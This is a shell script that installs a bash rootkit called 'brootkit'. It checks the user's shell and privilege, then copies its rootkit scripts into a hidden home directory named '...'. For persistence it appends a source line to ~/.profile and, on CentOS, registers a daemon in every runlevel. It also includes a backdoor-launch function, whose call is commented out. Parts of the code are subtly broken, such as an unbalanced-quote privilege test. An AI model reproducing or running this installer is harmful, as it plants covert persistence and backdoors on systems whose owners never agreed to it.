#!/bin/sh

BR_ROOTKIT_PATH="/home/$USER/..."
br_privilege=1

br_hookhup()
{
        :
}

br_check_shell()
{
	local line user shell

	while read line
	do
		user=`echo $line | cut -d ":" -f 1`
		shell=`echo $line | cut -d ":" -f 7`

		if [ "$user" != "$USER" ]; then
			continue
		fi

		if [ "$shell" == "/bin/sh" ]; then
			echo "detect user $USER has sh evnironment."
			return 
		fi
	done < /etc/passwd

	echo "user $USER hasn't sh environment." && exit
}

br_check_privilege()
{
        [ "$UID == "0" -o "$EUID == "0" ] && br_privilege=0 || br_privilege=1
}

br_set_rootkit_path()
{
	if [ $br_privilege -eq 1 ]; then
		BR_ROOTKIT_PATH="/home/$USER/..."
	else
		echo "install brootkit using root privilege."
	fi
}

br_centos_install()
{
	local idx

	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
	for idx in 0 1 2 3 4 5 6
	do
		ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc$idx.d/S10brdaemon
		[ $? -eq 1 ] && echo "copy brdaemon $idx failed." && exit
	done
}

br_creat_home()
{
	mkdir -p $BR_ROOTKIT_PATH -m 0700
	[ $? -eq 1 ] && echo "mkdir $BR_ROOTKIT_PATH failed." && exit

	cp brshrootkit.sh brsh.conf brshconfig.sh $BR_ROOTKIT_PATH
	[ $? -eq 1 ] && echo "copy brootkit failed." && exit

	chmod 700 $BR_ROOTKIT_PATH
}

br_install_backdoor()
{
        if ! type nohup >/dev/null; then
                nohup $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1
		[ $? -eq 1 ] && echo "install backdoor failed." && exit
        else
                trap br_hookhup SIGHUP
                $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1 &
		[ $? -eq 1 ] && echo "install backdoor failed." && exit
        fi
}

main()
{
	br_check_shell
	br_check_privilege
	br_set_rootkit_path
	br_creat_home
	#br_install_backdoor

	echo ". /home/$USER/..." >> ~/.profile

        if [ $? -eq 1 ]; then
                echo "install brootkit failed."
                exit
        else
                echo "install brootkit successful."
        fi

}

main
